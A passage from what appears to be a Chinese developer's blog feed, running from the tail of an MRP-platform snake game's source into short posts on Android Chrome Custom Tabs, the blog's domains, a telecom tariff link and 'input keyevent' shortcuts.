class="built_in">setTextSize</span>(<span class="number">1</span>,<span class="number">36</span>);</span><br><span class="line">maxl = <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">xside = (SCRW % <span class="number">10</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == xside)</span><br><span class="line"> &#123;</span><br><span class="line">xside = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">xside = xside + <span class="number">10</span>;</span><br><span class="line">yside = (sh % <span class="number">10</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == yside)</span><br><span class="line"> &#123;</span><br><span class="line">yside = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">yside = yside + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">colc = (SCRW - xside * <span class="number">2</span>) / v;</span><br><span class="line">linc = (sh - yside * <span class="number">2</span>) / v;</span><br><span class="line">timer=timercreate();</span><br><span class="line">inits();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inits</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"></span><br><span class="line">m = (linc / <span class="number">2</span>) *colc + colc / <span class="number">2</span>;</span><br><span class="line">arr[<span class="number">0</span>]=m;</span><br><span class="line">arr[<span class="number">1</span>]= m + colc;</span><br><span class="line">arr[<span class="number">2</span>]= m + colc * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">slen = <span class="number">3</span>;</span><br><span class="line">state = <span class="number">0</span>;</span><br><span class="line">last = _UP;</span><br><span class="line"></span><br><span class="line">dform();</span><br><span class="line">dsnake(slen);</span><br><span class="line">dfood();</span><br><span class="line">xs();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> j, l;</span><br><span class="line"></span><br><span class="line">l = arr[slen - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(j = slen - <span class="number">1</span>; j &gt; <span class="number">0</span>; j = j - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">arr[j]= arr[j - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">arr[<span class="number">0</span>]= arr[<span class="number">0</span>] + s;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> != isself())</span><br><span class="line"> &#123;</span><br><span class="line">gameover();</span><br><span class="line">&#125;</span><br><span class="line">eat(l);</span><br><span class="line">dsnake(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">(<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(arr[<span class="number">0</span>] == food)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">if</span>(slen &lt; maxl)</span><br><span class="line">  &#123;</span><br><span class="line">  arr[slen]=l;</span><br><span class="line">  slen = slen + <span class="number">1</span>;</span><br><span class="line">  xs();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  dclub(l, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dfood();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">dclub(l, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, r;</span><br><span class="line"></span><br><span class="line">i = arr[<span class="number">0</span>];</span><br><span class="line">r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; slen; j = j + <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(arr[j] == i)</span><br><span class="line">  &#123;</span><br><span class="line">  r = <span class="number">1</span>;</span><br><span class="line">  j = slen;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, r;</span><br><span class="line">r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; slen; i = i + <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(arr[i] == food)</span><br><span class="line">  &#123;</span><br><span class="line">  r = <span class="number">1</span>;</span><br><span class="line">  i = slen;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dform</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cls(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">drect(xside - <span class="number">2</span>, yside, <span class="number">2</span>, sh-yside*<span class="number">2</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line">drect(SCRW - xside, yside, <span class="number">2</span>, sh-yside*<span class="number">2</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line">drect(xside, yside - <span class="number">2</span>, sw-xside*<span class="number">2</span>, <span class="number">2</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line">drect(xside, sh - yside, sw-xside*<span class="number">2</span>, <span class="number">2</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line">ref(<span class="number">0</span>, <span class="number">0</span>, SCRW, SCRH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfood</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sand(getuptime());</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"> &#123;</span><br><span class="line"> food = rand() % (colc *linc);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">0</span> != isate());</span><br><span class="line"></span><br><span class="line">dclub(food, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dsnake</span><span class="params">(<span class="keyword">int</span> dl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">dclub(arr[<span class="number">0</span>], <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; dl; i = i + <span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> dclub(arr[i], <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dclub</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> r, <span class="keyword">int</span> g, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"></span><br><span class="line">x = v *(i % colc) + xside;</span><br><span class="line">y = v *(i / colc) + yside;</span><br><span class="line">drect(x, y, v, v, r / <span class="number">2</span>, g / <span class="number">2</span>, b / <span class="number">2</span>);</span><br><span class="line">drect(x + <span class="number">1</span>, y + <span class="number">1</span>, v<span class="number">-2</span>, v<span class="number">-2</span>, r, g, b);</span><br><span class="line">ref(x, y, v, v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gameover</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">stop</span>();</span><br><span class="line">inits();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cd</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(k == _LEFT)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(last != _RIGHT)</span><br><span class="line">  &#123;</span><br><span class="line">  last = k;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(k == _RIGHT)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(last != _LEFT)</span><br><span class="line">  &#123;</span><br><span class="line">  last = k;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(k == _UP)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(last != _DOWN)</span><br><span class="line">  &#123;</span><br><span class="line">  last = k;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(k == _DOWN)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(last != _UP)</span><br><span class="line">  &#123;</span><br><span class="line">  last = k;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(last == k)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">stop</span>();</span><br><span class="line"> _timer(<span class="number">0</span>);</span><br><span class="line"> start();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event</span><span class="params">(<span class="keyword">int</span> t, <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(t==MS_DOWN)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">if</span>(state)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span>(a&gt;<span class="number">0</span>&amp;&amp;a&lt;sw&amp;&amp;b&gt;<span class="number">0</span>&amp;&amp;b&lt;sh)</span><br><span class="line">   &#123; fx(a,b);&#125;</span><br><span class="line">   <span class="keyword">if</span>(a&gt;sw/<span class="number">2</span>&amp;&amp;a&lt;sw&amp;&amp;b&gt;sh&amp;&amp;b&lt;SCRH)</span><br><span class="line">   &#123; event(KY_DOWN,<span class="number">18</span>,<span class="number">0</span>);&#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(t==MS_UP)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">if</span>(a&gt;<span class="number">0</span>&amp;&amp;a&lt;sw&amp;&amp;b&gt;sh&amp;&amp;b&lt;SCRH)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span>(a&lt;sw/<span class="number">2</span>)</span><br><span class="line">   &#123; event(KY_UP,<span class="number">17</span>,<span class="number">0</span>);&#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; event(KY_UP,<span class="number">18</span>,<span class="number">0</span>);&#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(t == KY_DOWN)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">if</span>(state == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span>(a==<span class="number">18</span>)</span><br><span class="line">   timersettime(timer,js);</span><br><span class="line">   cd(a);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(t == KY_UP)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">if</span>(a == _SLEFT)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="number">0</span> == state)</span><br><span class="line">   &#123;</span><br><span class="line"> start();</span><br><span class="line">&#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line"><span class="built_in">stop</span>();</span><br><span class="line">&#125;</span><br><span class="line">   xs();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(a == _SRIGHT)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span>(state==<span class="number">1</span>)</span><br><span class="line">   timersettime(timer,s);</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">timerdel(timer);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//触屏方向控制</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fx</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> l=last;</span><br><span class="line"> <span class="keyword">if</span>(x&lt;sw/<span class="number">2</span>)</span><br><span class="line">  <span class="keyword">if</span>(y&lt;sh/<span class="number">2</span>) cd(l==<span class="number">14</span>||l==<span class="number">15</span>?<span class="number">12</span>:<span class="number">14</span>);</span><br><span class="line">  <span class="keyword">else</span> cd(l==<span class="number">14</span>||l==<span class="number">15</span>?<span class="number">13</span>:<span class="number">14</span>);</span><br><span class="line"> <span class="keyword">if</span>(x&gt;=sw/<span class="number">2</span>)</span><br><span class="line"> <span class="keyword">if</span>(y&lt;sh/<span class="number">2</span>) cd(l==<span class="number">14</span>||l==<span class="number">15</span>?<span class="number">12</span>:<span class="number">15</span>);</span><br><span class="line"> <span class="keyword">else</span> cd(l==<span class="number">14</span>||l==<span class="number">15</span>?<span class="number">13</span>:<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//底部按键显示</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> drect(<span class="number">0</span>,sh,sw,<span class="number">50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"> dtext(state==<span class="number">0</span>?<span class="string">"开始"</span>:<span class="string">"暂停"</span>,<span class="number">5</span>,sh+<span class="number">5</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"> dtext(state==<span class="number">0</span>?<span class="string">"退出"</span>:<span class="string">"加速"</span>,sw<span class="number">-75</span>,sh+<span class="number">5</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(txt,<span class="string">"%d"</span>,slen<span class="number">-3</span>);</span><br><span class="line"> dtext(txt,sw/<span class="number">2</span>,sh+<span class="number">5</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="number">200</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"> ref(<span class="number">0</span>,sh,sw,<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">timerstart(timer, s, <span class="number">0</span>, <span class="string">"_timer"</span>, TRUE);</span><br><span class="line">state = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">timerstop(timer);</span><br><span class="line">state = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _timer(int32 data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(last == _LEFT)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == arr[<span class="number">0</span>] % colc)</span><br><span class="line">&#123;</span><br><span class="line">gameover();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">go( - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(last == _DOWN)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[<span class="number">0</span>] &gt;= (linc - <span class="number">1</span>) *colc)</span><br><span class="line">&#123;</span><br><span class="line">gameover();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">go(colc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(last == _RIGHT)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((colc - <span class="number">1</span>) == arr[<span class="number">0</span>] % colc)</span><br><span class="line">&#123;</span><br><span class="line">gameover();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">go(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(last == _UP)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(arr[<span class="number">0</span>] &lt; colc)</span><br><span class="line">&#123;</span><br><span class="line">gameover();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">go( - colc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">resume</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若安卓手机分辨率太大导致显示蛇过小可以在init()中使用setscrsize()限制显示分辨率</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setscrsize(<span class="number">240</span>,SCRH*<span class="number">240</span>/SCRW);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>山东电信资费公示</title>
      <link href="/2023/shan-dong-dian-xin-zi-fei-gong-shi/"/>
      <url>/2023/shan-dong-dian-xin-zi-fei-gong-shi/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.189.cn/sd/zthd/pc/" target="_blank" rel="noopener">https://www.189.cn/sd/zthd/pc/</a></p><p>电信的公示套餐并不全，线下营业厅还有其他套餐，要到厅咨询才会告知</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ChromeCustomTabs快速使用</title>
      <link href="/2023/chromecustomtabs-kuai-su-shi-yong/"/>
      <url>/2023/chromecustomtabs-kuai-su-shi-yong/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CustomTabs在用户的默认浏览器中显示网页，相当于在自己的app中用默认浏览器打开网页，效果类似WebView，但使用起来比WebView轻量，也更安全，性能更好。</p></blockquote><a id="more"></a><p>使用CustomTabs可以使用浏览器中最新的内核，避免系统SystemWebView版本过低导致部分功能不支持  </p><p>新版Edge已经换到Chromium内核，也支持CustomTabs功能</p><ul><li>Edge 108内核最低兼容安卓6  </li><li>Edge 110内核最低兼容安卓7  </li></ul><p><a href="https://m.wandoujia.com/apps/7672441/history" target="_blank" rel="noopener">豌豆荚Edge下载</a></p><h4 id="快速使用："><a href="#快速使用：" class="headerlink" title="快速使用："></a>快速使用：</h4><p>引入依赖</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">implementation</span> "<span class="selector-tag">androidx</span><span class="selector-class">.browser</span><span class="selector-pseudo">:browser</span><span class="selector-pseudo">:1.4.0"</span></span><br></pre></td></tr></table></figure><p>安卓11以上系统检测时要适配软件包可见性</p><p>检测Chrome是否支持CustomTabs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isChromeSupported</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">    PackageManager pm = context.getPackageManager();</span><br><span class="line">    Intent serviceIntent = <span class="keyword">new</span> Intent(CustomTabsService.ACTION_CUSTOM_TABS_CONNECTION);</span><br><span class="line">    serviceIntent.setPackage(<span class="string">"com.android.chrome"</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;ResolveInfo&gt; resolveInfo = pm.queryIntentServices(serviceIntent, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(resolveInfo == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !resolveInfo.isEmpty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测Edge是否支持CustomTabs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEdgeSupported</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">    PackageManager pm = context.getPackageManager();</span><br><span class="line">    Intent serviceIntent = <span class="keyword">new</span> Intent(CustomTabsService.ACTION_CUSTOM_TABS_CONNECTION);</span><br><span class="line">    serviceIntent.setPackage(<span class="string">"com.microsoft.emmx"</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;ResolveInfo&gt; resolveInfo = pm.queryIntentServices(serviceIntent, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(resolveInfo == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !resolveInfo.isEmpty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用CustomTabs打开网页</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">openChromeCustomTab</span><span class="params">(Context context,String url)</span></span>&#123;</span><br><span class="line">    CustomTabsIntent.Builder builder = <span class="keyword">new</span> CustomTabsIntent.Builder();</span><br><span class="line">    builder.setShowTitle(<span class="keyword">true</span>);</span><br><span class="line">    CustomTabsIntent customTabsIntent = builder.build();</span><br><span class="line">    <span class="keyword">if</span>(isEdgeSupported(context))&#123;</span><br><span class="line">        customTabsIntent.intent.setPackage(<span class="string">"com.microsoft.emmx"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isChromeSupported(context)) &#123;</span><br><span class="line">        customTabsIntent.intent.setPackage(<span class="string">"com.android.chrome"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    customTabsIntent.launchUrl(context, Uri.parse(url));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当手机中没有浏览器支持CustomTabs，使用customTabsIntent.launchUrl()会跳转到默认浏览器或者打开浏览器选择</p><blockquote><p>参考：<a href="https://juejin.cn/post/6907508406169862157" target="_blank" rel="noopener">Android 打开网页之CustomTabs</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客域名</title>
      <link href="/2023/bo-ke-yu-ming/"/>
      <url>/2023/bo-ke-yu-ming/</url>
      
        <content type="html"><![CDATA[<p>最初使用github pages提供的二级域名 <a href="https://gddhy.github.io">gddhy.github.io</a> ，因为之前有段时间 *.github.io 在国内无法直接访问，就注册了自己的域名 <a href="https://gddhy.net" target="_blank" rel="noopener">gddhy.net</a>  </p><a id="more"></a><p>因为在 gddhy.net 域名下边挂了mrp商店 mrp.gddhy.net ，导致域名经常被QQ拦截，多次申请恢复还是拦截，腾讯客服那边建议换到国内IP和备案，只是想最低成本（白嫖）搞个博客，便没再管了</p><p>最近有朋友说域名在某些地区无法打开（现在博客部署在cloudflare pages），经测试 *.github.io 现在能正常访问，恢复在github pages部署，当个备份，也方便在QQ内直接访问</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">网页无法打开</span><br><span class="line"></span><br><span class="line">位于 <span class="attribute">https</span>:<span class="comment">//gddhy.net/2021/mrp-ping-tai-ying-yong-ru-kou/ 的网页无法加载，因为：</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">net</span>::ERR_CONNECTION_RESET</span><br></pre></td></tr></table></figure><p>现在博客域名</p><p>主要：<a href="https://gddhy.net" target="_blank" rel="noopener">https://gddhy.net</a><br>cloudflare pages：<a href="https://gddhy.pages.dev" target="_blank" rel="noopener">https://gddhy.pages.dev</a><br>github pages：<a href="https://gddhy.github.io">https://gddhy.github.io</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓特殊按键</title>
      <link href="/2023/an-zhuo-te-shu-an-jian/"/>
      <url>/2023/an-zhuo-te-shu-an-jian/</url>
      
        <content type="html"><![CDATA[<p>用 <code>input keyevent</code> 快速打开一些界面  </p><a id="more"></a>  <p>打开输入法</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> -c <span class="keyword">input</span> keyevent 63</span><br></pre></td></tr></table></figure><p>打开多任务</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">su</span> -c <span class="keyword">input</span> keyevent KEYCODE_APP_SWITCH</span><br></pre></td></tr></table></figure><p>没root可以使用 <code>adb shell</code> 代替 <code>su -c</code> 电脑执行</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无限流量卡能用多少流量？</title>
      <link href="/2023/wu-xian-liu-liang-qia-neng-yong-duo-shao-liu-liang/"/>
      <url>/2023/wu-xian-liu-liang-qia-neng-yong-duo-shao-liu-liang/</url>
      
